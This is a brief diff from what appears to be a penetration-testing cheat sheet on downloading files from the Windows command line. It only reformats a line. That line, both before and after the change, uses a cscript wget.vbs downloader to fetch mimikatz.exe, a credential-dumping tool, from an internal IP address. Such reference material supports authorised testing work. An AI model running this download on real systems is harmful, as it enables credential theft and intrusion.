@@ -212,7 +212,7 @@ https://superuser.com/questions/25538/how-to-download-files-from-command-line-in
 
 ## cscript wget.vbs
 
-cscript wget.vbs http://10.10.10.10/mimikatz.exe mimikatz.exe
+> cscript wget.vbs http://10.10.10.10/mimikatz.exe mimikatz.exe
 
 ```
 Set args = WScript.Arguments
